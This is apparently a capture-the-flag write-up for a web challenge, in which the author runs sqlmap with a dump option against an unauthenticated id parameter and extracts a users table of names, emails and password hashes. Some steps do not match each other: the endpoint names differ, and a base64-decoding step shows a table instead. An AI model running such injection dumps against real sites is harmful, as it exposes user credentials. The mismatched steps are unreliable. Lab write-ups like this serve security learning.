## Inbox
```
The developer emailed the flag to the admin , can you get it.
```
- Link: http://ec2-18-192-3-151.eu-central-1.compute.amazonaws.com/inbox/


#### Solve:

- Steps

    - After going to the site, I took a tour in it. I noticed in the source code that there is an API *"show.php"* that show the content of a message by an *id* without any type of authentication.

    - Let's hop on the terminal and fire up *sqlmap*:
        ```commandline
        sqlmap -u http://18.192.3.151/whoisadmin/shownews.php?id=1 --dump
        ```
      
    - After waiting sometime, sqlmap was able to detect the back-end DBS:
        ```
        [12:33:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' it looks like the back-end DBMS is 'SQLite'.
        ```
   
    - *sqlmap* was able to identify and fetch the table:
        ```
        ...
        [12:38:28] [INFO] fetching tables for database: 'SQLite_masterdb'
        [12:38:28] [INFO] fetching columns for table 'nxf8_users' in database 'SQLite_masterdb'
        [12:38:28] [INFO] fetching entries for table 'nxf8_users' in database 'SQLite_masterdb'
        [12:38:29] [INFO] recognized possible password hashes in column 'password'
        ...
        ```
      
    - Decode the base64 chunk *Q3liZXItVGFsZW50*:
        ```
        ...
        William   | user  | william@secret.org   | 0dc072aeaa2b7e4eecd636abb4fc535dd63342b8 |
        Ryan      | admin | ryan@secret.org      | 14c2fd1229d3b09afdfc9583b46640c57c5f40e1 |
        Shila     | user  | shila@secret.org     | ...
        ...
        ```
    - We can see that the admin's name is *Ryan* and his email is: ryan@secret.org

> **Flag: ryan@secret.org**